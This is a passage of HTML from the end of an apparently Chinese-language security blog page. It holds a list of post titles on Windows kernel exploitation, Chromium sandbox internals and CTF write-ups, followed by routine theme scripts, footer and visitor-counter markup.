class="post-list-item"><a class="post-list-link" href="/2018/06/03/chromium-sandbox-Filesystem-analysis/">Chromium-sandbox-Filesystem-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/chromium-sandbox-LowLevelPolicy-analysis/">Chromium-sandbox-LowLevelPolicy-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/chromium-sandbox-PolicyEngine-analysis/">Chromium-sandbox-PolicyEngine-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/chromium-sandbox-Resolver-analysis/">Chromium-sandbox-Resolver-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/chromium-sandbox-Interception/">Chromium-sandbox-Interception-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/21/chromium-sandbox-HandleCloser-analysis/">Chromium-sandbox-HandleCloser-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/20/chromium-sandbox-SharedMemIPC/">Chromium-sandbox-SharedMemIPC-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/chromium-sandbox-Crosscall-analysis/">Chromium-sandbox-crosscall-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/chromium-sandbox-AlternateDesktop-analysis/">Chromium-sandbox-AlternateDesktop-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/chromium-sandbox-Tokens-analysis/">Chromium-sandbox-Tokens-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/14/chromium-sandbox-Job-analysis/">Chromium-sandbox-Job-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-TargetPolicy-analysis/">Chromium-sandbox-TargetPolicy-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-TargetProcess-analysis/">Chromium-sandbox-TargetProcess-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-TargetServices-analysis/">Chromium-sandbox-TargetServices-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-BrokerServices/">Chromium-sandbox-BrokerServices-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/x41-浏览器安全白皮书笔记/">X41-浏览器安全白皮书读书笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/22/Windows系统机制之同步/">Windows系统机制之同步</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/21/Windows系统机制之对象管理器/">Windows系统机制之对象管理器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/21/Windows系统机制之陷阱分发/">Windows系统机制之陷阱分发</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/21/Bitmaps轶事：Windows 10纪念版前的GDI对象泄露/">Bitmap轶事：Windows 10纪念版后的GDI对象泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/理解池污染三部曲/">理解池污染三部曲</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/内核利用程序之Razer rzpnk.sys中的逻辑bug/">Windows exploit系列教程第十九篇：内核利用程序之Razer rzpnk.sys中的逻辑bug</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/内核利用程序之RS2 Bitmap巫术/">Windows exploit系列教程第十八篇：内核利用程序之RS2 Bitmap巫术</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/内核利用程序之滥用GDI Bitmap/">Windows exploit系列教程第十七部分：内核利用程序之任意位置任意写</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/内核利用程序之池溢出/">Windows exploit系列教程第十六部分：内核利用程序之池溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/内核利用程序之UAF/">Windows exploit系列教程第十五部分：内核利用程序之UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/coin1/">Writeup.pwnable.kr系列之coin1</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/shellshock/">Writeup.pwnable.kr系列之shellshock</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/09/mistake/">Writeup.pwnable.kr系列之mistake</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/07/leg/">Writeup.pwnable.kr系列之leg</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/input/">Writeup.pwnable.kr系列之input</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/random/">Writeup.pwnable.kr系列之random</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/passcode/">Writeup.pwnable.kr系列之passcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/04/flag/">Writeup.pwnable.kr系列之flag</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/04/bof/">Writeup.pwnable.kr系列之bof</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/collision/">Writeup.pwnable.kr系列之collision</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/fd/">Writeup.pwnable.kr系列之fd</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/Binary Security Assembly/">Binary-Security-Assembly</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/07/内核利用程序之整数溢出/">Windows exploit系列教程第十四部分：内核利用程序之整数溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/06/内核利用程序之未初始化栈变量/">Windows exploit系列教程第十三部分：内核利用程序之未初始化栈变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/06/内核利用程序之空指针引用/">Windows exploit系列教程第十二部分：内核利用程序之空指针引用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/01/内核利用程序之任意位置任意写/">Windows exploit系列教程第十一部分：内核利用程序之任意位置任意写</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/ring0层exp原语之滥用GDI/">ring0层exp原语之滥用GDI</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/14/Windows x64内核提权/">Windows x64内核提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/14/关键的Windows内核数据结构一览（下）/">关键的Windows内核数据结构一览（下）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/08/关键的Windows内核数据结构一览（上）/">关键的Windows内核数据结构一览（上）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/06/内核利用程序开发之栈溢出/">Windows exploit系列教程第十部分：内核利用程序之栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/05/堆喷射[第二章：UAF]/">Windows exploit系列教程第九部分：堆喷射[第二章：UAF]</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/30/Kernel Driver mmap Handler Exploitation/">内核驱动mmap Handler利用技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/28/API Interception via DLL Redirection/">通过DLL重定向实现API劫持</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/Linux中断内幕/">Linux中断内幕</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/19/Windows架构设计/">Windows架构设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/30/house_of_force.log/">house_of_force log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/25/Linux内存管理-非连续内存区管理/">Linux内核学习——内存管理之非连续内存区管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/24/Linux内存管理-内存区管理/">Linux内核学习——内存管理之内存区管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/20/Linux内存管理-页框管理/">Linux内核学习——内存管理之页框管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/first_fit.log/">first_fit log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/house_of_einherjar.log/">house_of_einherjar log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/18/fastbin_dup_into_stack.log/">fastbin_dup_into_stack log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/12/fastbin_dup.log/">fastbin_dup log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/Windows栈溢出之ret eip/">Windows栈溢出之ret eip</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/Windows栈溢出概述/">Windows栈溢出概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/16/DEFCON-2015-r0pbaby/">DEFCON-2015-r0pbaby</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/PWN选手的自我修养/">PWN选手的自我修养</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/linearsort/">linear sort</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/quicksort/">quicksort</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/heapsort&priority-queue/">heapsort & priority-queue</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/Linux进程的创建与撤销/">Linux内核学习——Linux进程的创建与撤销</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/26/Linux进程切换/">Linux内核学习——Linux进程切换</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/24/GNU Hash ELF Sections/">GNU Hash ELF Sections</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/22/Linux进程概述/">Linux内核学习——Linux进程概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/18/Linux内存寻址/">Linux内核学习——内存寻址</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/PlaySms  1.4代码执行漏洞之import csv/">PlaySms 1.4代码执行漏洞之import csv</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/PlaySms  1.4代码执行漏洞分析/">PlaySms 1.4代码执行漏洞分析</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 r00tk1t
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >访问数量: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
